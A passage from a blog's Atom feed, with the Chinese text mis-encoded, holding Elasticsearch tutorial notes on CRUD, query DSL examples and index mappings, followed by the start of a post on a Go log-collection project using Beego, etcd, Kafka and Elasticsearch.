alt="5"></p><p>ç”±äºESè‡ªåŠ¨ç”Ÿæˆçš„<code>id</code>ä¸ä¾¿äºè®°å¿†ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥è‡ªå®šä¹‰idï¼Œåªéœ€è¦åœ¨<code>_doc</code>åå†™å…¥è‡ªå®šä¹‰çš„idå³å¯</p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/6.png" alt="6"></p><h4 id="æŸ¥è¯¢æ–‡æ¡£"><a href="#æŸ¥è¯¢æ–‡æ¡£" class="headerlink" title="æŸ¥è¯¢æ–‡æ¡£"></a>æŸ¥è¯¢æ–‡æ¡£</h4><p>åªéœ€è¦å°†åˆ›å»ºæ–‡æ¡£çš„è¯·æ±‚æ–¹å¼æ”¹ä¸º<code>GET</code>å³å¯ï¼Œå…¶ä¸­<code>_doc</code>åé¢çš„<code>1001</code>ç›¸å½“äºä¸»é”®</p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/7.png" alt="7"></p><p>è·å–ç´¢å¼•ä¸‹çš„æ‰€æœ‰æ•°æ®ï¼Œå¯ä»¥åœ¨è¯·æ±‚çš„ç´¢å¼•ååŠ <code>_search</code></p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/8.png" alt="8"></p><h4 id="ä¿®æ”¹ç´¢å¼•ä¸‹çš„æ•°æ®"><a href="#ä¿®æ”¹ç´¢å¼•ä¸‹çš„æ•°æ®" class="headerlink" title="ä¿®æ”¹ç´¢å¼•ä¸‹çš„æ•°æ®"></a>ä¿®æ”¹ç´¢å¼•ä¸‹çš„æ•°æ®</h4><h5 id="å…¨é‡æ›´æ–°"><a href="#å…¨é‡æ›´æ–°" class="headerlink" title="å…¨é‡æ›´æ–°"></a>å…¨é‡æ›´æ–°</h5><p>å› ä¸ºå…¨é‡æ›´æ–°çš„è¯·æ±‚æ˜¯æ»¡è¶³å¹‚ç­‰æ¡ä»¶çš„ï¼Œå› æ­¤è¯·æ±‚æ–¹å¼ä¸º<code>PUT</code>ï¼Œå°†éœ€è¦ä¿®æ”¹çš„å†…å®¹ä»¥<code>JSON</code>æ ¼å¼å†™å…¥è¯·æ±‚ä½“</p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/9.png" alt="9"></p><h5 id="å±€éƒ¨æ›´æ–°"><a href="#å±€éƒ¨æ›´æ–°" class="headerlink" title="å±€éƒ¨æ›´æ–°"></a>å±€éƒ¨æ›´æ–°</h5><p>å±€éƒ¨æ›´æ–°çš„è¯·æ±‚ä¸æ»¡è¶³å¹‚ç­‰æ¡ä»¶ï¼Œå› æ­¤è¯·æ±‚æ–¹å¼ä¸º<code>POST</code>ï¼Œè€Œä¸”å› ä¸ºæ˜¯å±€éƒ¨æ›´æ–°ï¼Œå› æ­¤ç´¢å¼•ååé¢è¦å†™<code>_update</code>è€Œä¸èƒ½å†™<code>_doc</code></p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/10.png" alt="10"></p><h4 id="åˆ é™¤æ•°æ®"><a href="#åˆ é™¤æ•°æ®" class="headerlink" title="åˆ é™¤æ•°æ®"></a>åˆ é™¤æ•°æ®</h4><p>èµ„æºåœ°å€å’Œåˆ›å»ºæ—¶æ˜¯ä¸€æ ·çš„ï¼Œè¯·æ±‚æ–¹å¼å˜ä¸º<code>DELETE</code></p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/11.png" alt="11"></p><h4 id="æ¡ä»¶æŸ¥è¯¢"><a href="#æ¡ä»¶æŸ¥è¯¢" class="headerlink" title="æ¡ä»¶æŸ¥è¯¢"></a>æ¡ä»¶æŸ¥è¯¢</h4><h5 id="è¯·æ±‚è·¯å¾„æŸ¥è¯¢"><a href="#è¯·æ±‚è·¯å¾„æŸ¥è¯¢" class="headerlink" title="è¯·æ±‚è·¯å¾„æŸ¥è¯¢"></a>è¯·æ±‚è·¯å¾„æŸ¥è¯¢</h5><p>è¯·æ±‚æ–¹å¼ä¸º<code>GET</code>ï¼Œè¯·æ±‚è·¯å¾„ä¸º<code>http://localhost:9200/shopping/_search?q=category:iphone13</code></p><p>è¯¥è¯·æ±‚è·¯å¾„è¡¨ç¤ºæŸ¥è¯¢shoppingç´¢å¼•ä¸‹<code>category=iphone13</code>çš„æ‰€æœ‰ç»“æœ</p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/12.png" alt="12"></p><h5 id="è¯·æ±‚ä½“æŸ¥è¯¢"><a href="#è¯·æ±‚ä½“æŸ¥è¯¢" class="headerlink" title="è¯·æ±‚ä½“æŸ¥è¯¢"></a>è¯·æ±‚ä½“æŸ¥è¯¢</h5><p>è¯·æ±‚ä½“æŸ¥è¯¢åœ¨è¯·æ±‚è·¯å¾„åªéœ€è¦è¾“å…¥<code>http://localhost:9200/shopping/_search</code>ï¼Œåœ¨è¯·æ±‚ä½“ä¸­æ·»åŠ <code>JSON</code>æŸ¥è¯¢è¯·æ±‚å¦‚ä¸‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match"</span>:&#123;</span><br><span class="line">            <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearchç¬”è®°/13.png" alt="13"></p><p>å¦‚æœè¦å…¨é‡æŸ¥è¯¢ï¼Œåªéœ€è¦å°†è¯·æ±‚ä½“ä¸­çš„<code>match</code>æ”¹ä¸º<code>match_all</code>å³å¯</p><h4 id="åˆ†é¡µæŸ¥è¯¢"><a href="#åˆ†é¡µæŸ¥è¯¢" class="headerlink" title="åˆ†é¡µæŸ¥è¯¢"></a>åˆ†é¡µæŸ¥è¯¢</h4><p>å…¨é‡æŸ¥è¯¢çš„è¯æ•°æ®é‡ä¼šå¾ˆå¤§ï¼Œå› æ­¤æˆ‘ä»¬å¯ä»¥é‡‡ç”¨åˆ†é¡µæŸ¥è¯¢</p><p>è¯·æ±‚ä½“ä¸­æ·»åŠ <code>JSON</code>å¦‚ä¸‹ï¼Œå…¶ä¸­<code>from</code>è¡¨ç¤ºä»å“ªä¸€é¡µå¼€å§‹ï¼Œ0è¡¨ç¤ºç¬¬ä¸€é¡µã€‚sizeè¡¨ç¤ºé¡µçš„å¤§å°ï¼Œå³æ¯ä¸€é¡µæœ‰å¤šå°‘æ¡æ•°æ®ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearchç¬”è®°/14.png" alt="14"></p><h4 id="æŸ¥è¯¢ç»“æœæ•°æ®æºæ§åˆ¶"><a href="#æŸ¥è¯¢ç»“æœæ•°æ®æºæ§åˆ¶" class="headerlink" title="æŸ¥è¯¢ç»“æœæ•°æ®æºæ§åˆ¶"></a>æŸ¥è¯¢ç»“æœæ•°æ®æºæ§åˆ¶</h4><p>åœ¨è¯·æ±‚ä½“ä¸­æ·»åŠ <code>JSON</code>è¯·æ±‚æŸ¥è¯¢å¦‚ä¸‹ï¼Œå…¶ä¸­<code>_source</code>è¡¨ç¤ºæ‰€è¦å±•ç¤ºçš„æ•°æ®æºï¼Œè¿™é‡Œæˆ‘ä»¬è®¾ç½®åªæ˜¾ç¤º<code>title</code>å­—æ®µ</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span>,</span><br><span class="line">  <span class="attr">"_source"</span> : [<span class="string">"title"</span>]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearchç¬”è®°/15.png" alt="15"></p><h4 id="æŸ¥è¯¢ç»“æœæ’åº"><a href="#æŸ¥è¯¢ç»“æœæ’åº" class="headerlink" title="æŸ¥è¯¢ç»“æœæ’åº"></a>æŸ¥è¯¢ç»“æœæ’åº</h4><p>åœ¨è¯·æ±‚ä½“ä¸­æ·»åŠ <code>JSON</code>è¯·æ±‚æŸ¥è¯¢å¦‚ä¸‹ï¼Œå…¶ä¸­<code>sort</code>è¡¨ç¤ºæ‰€è¦è¦å¯¹æ•°æ®è¿›è¡Œæ’åºï¼Œè¿™é‡Œæˆ‘ä»¬è®¾ç½®æŒ‰ç…§ä»·æ ¼è¿›è¡Œé™åºæ’åºï¼Œ</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"match_all"</span>:&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"from"</span> : <span class="number">0</span>,</span><br><span class="line">    <span class="attr">"size"</span>: <span class="number">2</span>,</span><br><span class="line">    <span class="attr">"_source"</span> : [<span class="string">"title"</span>],</span><br><span class="line">    <span class="attr">"sort"</span> : &#123;</span><br><span class="line">        <span class="attr">"price"</span> : &#123;</span><br><span class="line">            <span class="attr">"order"</span> : <span class="string">"desc"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearchç¬”è®°/16.png" alt="16"></p><h4 id="å¤šæ¡ä»¶æŸ¥è¯¢"><a href="#å¤šæ¡ä»¶æŸ¥è¯¢" class="headerlink" title="å¤šæ¡ä»¶æŸ¥è¯¢"></a>å¤šæ¡ä»¶æŸ¥è¯¢</h4><h5 id="å¤šæ¡ä»¶åŒæ—¶æˆç«‹"><a href="#å¤šæ¡ä»¶åŒæ—¶æˆç«‹" class="headerlink" title="å¤šæ¡ä»¶åŒæ—¶æˆç«‹"></a>å¤šæ¡ä»¶åŒæ—¶æˆç«‹</h5><p>è¯·æ±‚ä½“å¦‚ä¸‹ï¼Œå…¶ä¸­<code>bool</code>ä»£è¡¨æ¡ä»¶æŸ¥è¯¢ï¼Œ<code>must</code>è¡¨ç¤ºå¤šä¸ªæ¡ä»¶å¿…é¡»åŒæ—¶æˆç«‹</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"must"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"7999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearchç¬”è®°/17.png" alt="17"></p><h5 id="å¤šæ¡ä»¶ä»»æ„æˆç«‹"><a href="#å¤šæ¡ä»¶ä»»æ„æˆç«‹" class="headerlink" title="å¤šæ¡ä»¶ä»»æ„æˆç«‹"></a>å¤šæ¡ä»¶ä»»æ„æˆç«‹</h5><p>è¯·æ±‚ä½“å¦‚ä¸‹ï¼Œå…¶ä¸­<code>bool</code>ä»£è¡¨æ¡ä»¶æŸ¥è¯¢ï¼Œ<code>should</code>è¡¨ç¤ºå¤šä¸ªæ¡ä»¶ä»»æ„æˆç«‹ä¸€ä¸ªéƒ½è¡Œï¼Œè¿™ä¸ªæ—¶å€™æˆ‘ä»¬ä¼šåŒæ—¶æŸ¥å‡ºä»·æ ¼ä¸º5999å’Œ7999çš„ç»“æœ</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"should"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"5999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;,</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"price"</span>:<span class="string">"7999"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ]</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/Users/caoyifan/blog/source/_posts/Elasticsearchç¬”è®°/18.png" alt="18"></p><h4 id="èŒƒå›´æŸ¥è¯¢"><a href="#èŒƒå›´æŸ¥è¯¢" class="headerlink" title="èŒƒå›´æŸ¥è¯¢"></a>èŒƒå›´æŸ¥è¯¢</h4><p>è¯·æ±‚ä½“å¦‚ä¸‹ï¼Œå…¶ä¸­<code>filter</code>è¡¨ç¤ºè¿‡æ»¤ï¼Œ<code>range</code>è¡¨ç¤ºèŒƒå›´ï¼Œæˆ‘ä»¬é€‰æ‹©<code>price</code>å¤§äº6000ä½œä¸ºæ¡ä»¶ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span>:&#123;</span><br><span class="line">        <span class="attr">"bool"</span> : &#123;</span><br><span class="line">            <span class="attr">"should"</span> : [</span><br><span class="line">                &#123;</span><br><span class="line">                    <span class="attr">"match"</span> :&#123;</span><br><span class="line">                        <span class="attr">"category"</span>:<span class="string">"iphone13"</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            ],</span><br><span class="line">            <span class="attr">"filter"</span> : &#123;</span><br><span class="line">                <span class="attr">"range"</span> : &#123;</span><br><span class="line">                    <span class="attr">"price"</span> : &#123;</span><br><span class="line">                        <span class="attr">"gt"</span> : <span class="number">6000</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearchç¬”è®°/19.png" alt="19"></p><h4 id="å®Œå…¨åŒ¹é…"><a href="#å®Œå…¨åŒ¹é…" class="headerlink" title="å®Œå…¨åŒ¹é…"></a>å®Œå…¨åŒ¹é…</h4><p>ESåœ¨è¿›è¡ŒåŒ¹é…æŸ¥è¯¢çš„æ—¶å€™ï¼Œä¼šå¯¹æ–‡å­—è¿›è¡Œæ’è¯ä¹‹åå€’æ’ç´¢å¼•ï¼Œå› æ­¤å¯¹äº<code>category=åä¸º</code>æ¥è®²ï¼Œæˆ‘ä»¬åœ¨<code>match</code>åŒ¹é…çš„æ—¶å€™åªå†™ä¸€ä¸ªåæˆ–æ˜¯ä¸€ä¸ªä¸ºï¼ŒESéƒ½ä¼šåŒ¹é…å‡º<code>category=åä¸º</code>çš„ç»“æœã€‚å¦‚æœæˆ‘ä»¬éœ€è¦å®Œå…¨åŒ¹é…çš„è¯ï¼Œéœ€è¦å°†<code>match</code>æ”¹ä¸º<code>match_phrase</code></p><h4 id="é«˜äº®æŸ¥è¯¢"><a href="#é«˜äº®æŸ¥è¯¢" class="headerlink" title="é«˜äº®æŸ¥è¯¢"></a>é«˜äº®æŸ¥è¯¢</h4><p>è¯·æ±‚ä½“å¦‚ä¸‹ï¼Œè¿™é‡Œæˆ‘ä»¬çš„åŒ¹é…è§„åˆ™æ˜¯<code>category=iphone13</code>ï¼Œå¹¶å¯¹<code>category</code>å­—æ®µè¿›è¡Œé«˜äº®å¤„ç†</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"query"</span> : &#123;</span><br><span class="line">        <span class="attr">"match"</span> : &#123;</span><br><span class="line">            <span class="attr">"category"</span> : <span class="string">"iphone13"</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    <span class="attr">"highlight"</span> : &#123;</span><br><span class="line">        <span class="attr">"fields"</span> : &#123;</span><br><span class="line">            <span class="attr">"category"</span> : &#123;&#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearchç¬”è®°/20.png" alt="20"></p><h4 id="æ˜ å°„å…³ç³»"><a href="#æ˜ å°„å…³ç³»" class="headerlink" title="æ˜ å°„å…³ç³»"></a>æ˜ å°„å…³ç³»</h4><h5 id="åˆ›å»ºä¸€ä¸ªç´¢å¼•æ˜ å°„"><a href="#åˆ›å»ºä¸€ä¸ªç´¢å¼•æ˜ å°„" class="headerlink" title="åˆ›å»ºä¸€ä¸ªç´¢å¼•æ˜ å°„"></a>åˆ›å»ºä¸€ä¸ªç´¢å¼•æ˜ å°„</h5><p>é¦–å…ˆåˆ›å»ºä¸€ä¸ª<code>test</code>ç´¢å¼•</p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/21.png" alt="21"></p><p>åˆ›å»ºç´¢å¼•çš„ç»“æ„ä¿¡æ¯</p><p>è¯·æ±‚è·¯å¾„ä¸º<code>http://localhost:9200/test/_mapping</code>ï¼Œè¯·æ±‚æ–¹å¼ä¸º<code>PUT</code>ï¼Œè¯·æ±‚ä½“å¦‚ä¸‹ï¼Œå…¶ä¸­<code>properties</code>è¡¨ç¤ºå±æ€§è®¾ç½®ï¼Œ<code>type=text</code>è¡¨ç¤º<code>name</code>å¯ä»¥åˆ†è¯å¤„ç†ï¼Œ<code>index=true</code>è¡¨ç¤º<code>name</code>å¯ä»¥è¢«ç´¢å¼•æŸ¥è¯¢ï¼Œ<code>type=keyword</code>è¡¨ç¤º<code>sex</code>ä¸å¯ä»¥åˆ†è¯å¤„ç†ï¼Œå¿…é¡»å®Œæ•´åŒ¹é…ã€‚</p><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">&#123;</span><br><span class="line">    <span class="attr">"properties"</span> : &#123;</span><br><span class="line">        <span class="attr">"name"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"text"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"sex"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">true</span></span><br><span class="line">        &#125;,</span><br><span class="line">        <span class="attr">"tel"</span> : &#123;</span><br><span class="line">            <span class="attr">"type"</span> : <span class="string">"keyword"</span>,</span><br><span class="line">            <span class="attr">"index"</span> : <span class="literal">false</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><img src="/2021/11/16/Elasticsearchç¬”è®°/22.png" alt="22"></p><h5 id="å¢åŠ æ•°æ®"><a href="#å¢åŠ æ•°æ®" class="headerlink" title="å¢åŠ æ•°æ®"></a>å¢åŠ æ•°æ®</h5><p><img src="/2021/11/16/Elasticsearchç¬”è®°/23.png" alt="23"></p><h5 id="æŸ¥è¯¢æ•°æ®"><a href="#æŸ¥è¯¢æ•°æ®" class="headerlink" title="æŸ¥è¯¢æ•°æ®"></a>æŸ¥è¯¢æ•°æ®</h5><p>å› ä¸ºæˆ‘ä»¬çš„<code>name</code>è®¾ç½®çš„æ˜¯å¯ä»¥åˆ†è¯ï¼Œå› æ­¤æˆ‘ä»¬åœ¨æŸ¥è¯¢çš„æ—¶å€™å¯¹äº<code>name</code>åªåŒ¹é…ä¸€ä¸ªå­—ä¹Ÿå¯ä»¥æŸ¥è¯¢å‡ºæ¥ç»“æœã€‚</p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/24.png" alt="24"></p><p>å¯¹äº<code>sex</code>å› ä¸ºæˆ‘ä»¬è®¾ç½®çš„æ˜¯<code>keyword</code>ï¼Œå› æ­¤ä¸å¯ä»¥åˆ†è¯æŸ¥è¯¢ã€‚å¿…é¡»å®Œå…¨åŒ¹é…ã€‚</p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/25.png" alt="25"></p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/26.png" alt="26"></p><p>è€Œå¯¹äº<code>tel</code>å­—æ®µï¼Œå› ä¸º<code>index</code>ä¸º<code>false</code>ï¼Œå³ä¸å¯ä»¥é€šè¿‡ç´¢å¼•è¿›è¡ŒæŸ¥è¯¢ï¼Œå› æ­¤æˆ‘ä»¬æ— æ³•æ ¹æ®<code>tel</code>å­—æ®µæŸ¥åˆ°æ•°æ®ã€‚</p><p><img src="/2021/11/16/Elasticsearchç¬”è®°/27.png" alt="27"></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;ElasticSearchç®€ä»‹&quot;&gt;&lt;a href=&quot;#ElasticSearchç®€ä»‹&quot; class=&quot;headerlink&quot; title=&quot;ElasticSearchç®€ä»‹&quot;&gt;&lt;/a&gt;ElasticSearchç®€ä»‹&lt;/h4&gt;&lt;p&gt;Elasticsearchæ˜¯ä¸€ä¸ªåŸºäº
      
    
    </summary>
    
    
      <category term="Notes" scheme="elssm.github.io/tags/Notes/"/>
    
  </entry>
  
  <entry>
    <title>Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†</title>
    <link href="elssm.github.io/2021/11/12/Go%E6%97%A5%E5%BF%97%E6%94%B6%E9%9B%86%E9%A1%B9%E7%9B%AE%E6%B5%81%E7%A8%8B%E6%A2%B3%E7%90%86/"/>
    <id>elssm.github.io/2021/11/12/Goæ—¥å¿—æ”¶é›†é¡¹ç›®æµç¨‹æ¢³ç†/</id>
    <published>2021-11-12T07:10:44.000Z</published>
    <updated>2021-12-13T09:45:21.439Z</updated>
    
    <content type="html"><![CDATA[<h4 id="ç®€ä»‹"><a href="#ç®€ä»‹" class="headerlink" title="ç®€ä»‹"></a>ç®€ä»‹</h4><p>è¯¥é¡¹ç›®ä¸»è¦åˆ†ä¸ºä¸‰ä¸ªéƒ¨åˆ†ï¼Œwebç«¯è´Ÿè´£å¯¹etcdçš„å†™å…¥ä»¥åŠä»mysqlè¯»å†™æ•°æ®è¿›è¡Œå±•ç¤ºã€‚logAgentè´Ÿè´£æ—¥å¿—çš„æ”¶é›†ï¼Œä¸»è¦æ˜¯é€šè¿‡tailä»etcdä¸­å®æ—¶è·å–æ‰€è¦æ”¶é›†çš„æ—¥å¿—é¡¹ï¼Œç„¶åé€šè¿‡saramaä»ç›¸åº”çš„æ—¥å¿—æ–‡ä»¶è¯»å–æ—¥å¿—ä¿¡æ¯å‘é€åˆ°Kafkaã€‚logTransferè´Ÿè´£ä»Kafkaä¸­è¯»å–æ—¥å¿—ï¼Œå¹¶å°†æ—¥å¿—å†™å…¥elasticsearchæœ€åé€šè¿‡Kibanaè¿›è¡Œæ—¥å¿—çš„æ£€ç´¢ã€‚</p><h4 id="logBeegoWeb"><a href="#logBeegoWeb" class="headerlink" title="logBeegoWeb"></a>logBeegoWeb</h4><p>å‰ç«¯ä½¿ç”¨Beegoæ¡†æ¶å®Œæˆã€‚åœ¨è¿è¡Œé¡¹ç›®ä¹‹å‰ï¼Œé¦–å…ˆå®‰è£…beeè„šæ‰‹æ¶ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">go get github.com/beego/bee</span><br></pre></td></tr></table></figure><p>æ‰§è¡Œ<code>bee</code>å‘½ä»¤æŸ¥çœ‹æ˜¯å¦å®‰è£…æˆåŠŸã€‚</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">caoyifan@MacBookPro ~ % bee</span><br><span class="line">Bee is a Fast and Flexible tool for managing your Beego Web Application.</span><br><span class="line"></span><br><span class="line">USAGE</span><br><span class="line">    bee command [arguments]</span><br><span class="line"></span><br><span class="line">AVAILABLE COMMANDS</span><br><span class="line"></span><br><span class="line">    version     Prints the current Bee version</span><br><span class="line">    migrate     Runs database migrations</span><br><span class="line">    api         Creates a Beego API application</span><br><span class="line">    bale        Transforms non-Go files to Go source files</span><br><span class="line">    fix         Fixes your application by making it compatible with newer versions of Beego</span><br><span class="line">    pro         Source code generator</span><br><span class="line">    dlv         Start a debugging session using Delve</span><br><span class="line">    dockerize   Generates a Dockerfile for your Beego application</span><br><span class="line">    generate    Source code generator</span><br><span class="line">    hprose      Creates an RPC application based on Hprose and Beego frameworks</span><br><span class="line">    new         Creates a Beego application</span><br><span class="line">    pack        Compresses a Beego application into a single file</span><br><span class="line">    rs          Run customized scripts</span><br><span class="line">    run         Run the application by starting a local development server</span><br><span class="line">    server      serving static content over HTTP on port</span><br><span class="line">    update      Update Bee</span><br><span class="line"></span><br><span class="line">Use bee help [command] for more information about a command.</span><br><span class="line"></span><br><span class="line">ADDITIONAL HELP TOPICS</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Use bee help [topic] for more information about that topic.</span><br></pre></td></tr></table></figure><p>è¿›å…¥logBeegoWebæ–‡ä»¶å¤¹ï¼Œ<code>bee run</code>å¯åŠ¨é¡¹ç›®</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span 